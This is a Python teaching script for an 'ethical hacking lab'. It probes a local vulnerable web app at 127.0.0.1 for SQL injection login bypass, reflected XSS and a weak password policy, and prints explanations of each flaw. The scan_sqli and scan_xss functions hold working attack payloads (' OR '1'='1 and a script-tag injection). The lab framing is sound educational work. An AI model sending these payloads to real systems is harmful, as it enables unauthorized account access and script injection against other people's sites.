import requests
import sys
import time

# Configuration
TARGET_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{TARGET_URL}/login"
SEARCH_URL = f"{TARGET_URL}/search"
SIGNUP_URL = f"{TARGET_URL}/signup"

def print_banner():
    print("""
    =============================================
       ETHICAL HACKING LAB - TUTOR & SCANNER
    =============================================
    This tool actively scans your local vulnerable app
    and explains the security concepts.
    """)

def check_server_status():
    try:
        r = requests.get(TARGET_URL)
        if r.status_code == 200:
            print("[+] Target server is UP and reachable.")
            return True
    except requests.exceptions.ConnectionError:
        print("[-] Target server is DOWN. Please run 'python vulnerable_app.py' in a separate terminal.")
        return False

def explain_sqli():
    print("\n[!] VULNERABILITY DETECTED: SQL Injection (SQLi)")
    print("------------------------------------------------")
    print("Explanation:")
    print("The login form is vulnerable because it directly inserts user input into a SQL query.")
    print("Code likely looks like this:")
    print("  query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"")
    print("\nWhy it works:")
    print("By entering \"' OR '1'='1\", the query becomes:")
    print("  SELECT * FROM users WHERE username = '' OR '1'='1' ...")
    print("Since '1'='1' is always TRUE, the database returns the first user (often Admin) regardless of the password.")
    print("------------------------------------------------")

def scan_sqli():
    print("\n[*] Scanning for SQL Injection on Login Page...")
    # Payload designed to bypass login: ' OR '1'='1
    payloads = ["' OR '1'='1", "' OR '1'='1' --"]
    
    for payload in payloads:
        print(f"[*] Testing payload: {payload}")
        data = {
            'username': payload,
            'password': 'password' # Doesn't matter
        }
        
        try:
            r = requests.post(LOGIN_URL, data=data)
            # If successful, we should see "Welcome" or be redirected to index with a session
            # Our app redirects to index, which says "Welcome, admin!" or similar.
            # Let's check if the response contains "Welcome" or "admin" (if it follows redirect)
            
            if "Welcome" in r.text or "admin" in r.text:
                print(f"[+] SUCCESS! Login bypassed with payload: {payload}")
                explain_sqli()
                return
            elif r.history: # If there was a redirect
                # Check the page we landed on
                if "Welcome" in r.text or "admin" in r.text:
                    print(f"[+] SUCCESS! Login bypassed with payload: {payload}")
                    explain_sqli()
                    return
        except Exception as e:
            print(f"[-] Error during request: {e}")

    print("[-] SQL Injection not detected with standard payloads.")

def explain_xss():
    print("\n[!] VULNERABILITY DETECTED: Reflected Cross-Site Scripting (XSS)")
    print("------------------------------------------------")
    print("Explanation:")
    print("The search page reflects your input back to the browser without sanitization.")
    print("\nWhy it works:")
    print("The browser construes <script> tags as executable code, not text.")
    print("An attacker can use this to steal cookies, redirect users, or deface the site.")
    print("------------------------------------------------")

def scan_xss():
    print("\n[*] Scanning for XSS on Search Page...")
    # Simple payload
    payload = "<script>alert('XSS')</script>"
    
    try:
        # GET request
        r = requests.get(SEARCH_URL, params={'q': payload})
        
        if payload in r.text:
            print(f"[+] SUCCESS! XSS Payload reflected in response.")
            explain_xss()
        else:
             print("[-] XSS Payload not found in response (might be escaped).")
             
    except Exception as e:
        print(f"[-] Error during request: {e}")

def explain_weak_password():
    print("\n[!] VULNERABILITY DETECTED: Weak Password Policy")
    print("------------------------------------------------")
    print("Explanation:")
    print("The application accepts very short or common passwords.")
    print("\nImpact:")
    print("Attackers can easily guess passwords using 'Brute Force' or 'Dictionary Attacks'.")
    print("It allows users to compromise their own security.")
    print("------------------------------------------------")

def scan_weak_password():
    print("\n[*] Checking Password Complexity Policy...")
    # We will try to signup with proper credentials but weak password
    import random
    user = f"testuser_{random.randint(1000,9999)}"
    weak_pass = "123"
    
    data = {
        'username': user,
        'password': weak_pass
    }
    
    try:
        # We need to handle cookies if it uses sessions, but for signup it usually just redirects
        # We are checking if it ALLOWS the creation.
        r = requests.post(SIGNUP_URL, data=data)
        
        # If it redirects to login (status 200 after redirect or 302 code), it likely succeeded.
        # Our app redirects to login on success.
        
        # Checking if we can login with it
        login_data = {'username': user, 'password': weak_pass}
        r_login = requests.post(LOGIN_URL, data=login_data)
        
        if "Welcome" in r_login.text or f"Welcome, {user}" in r_login.text or r_login.url.endswith('/'):
            print(f"[+] SUCCESS! Account created with weak password: '{weak_pass}'")
            explain_weak_password()
        else:
            print("[-] Semms like weak password was rejected (or other error).")
            
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    print_banner()
    if not check_server_status():
        return
    
    print("\n--- Starting Lab Session ---\n")
    
    scan_sqli()
    time.sleep(1)
    
    scan_xss()
    time.sleep(1)
    
    scan_weak_password()
    
    print("\n--- Lab Session Complete ---")

if __name__ == "__main__":
    main()
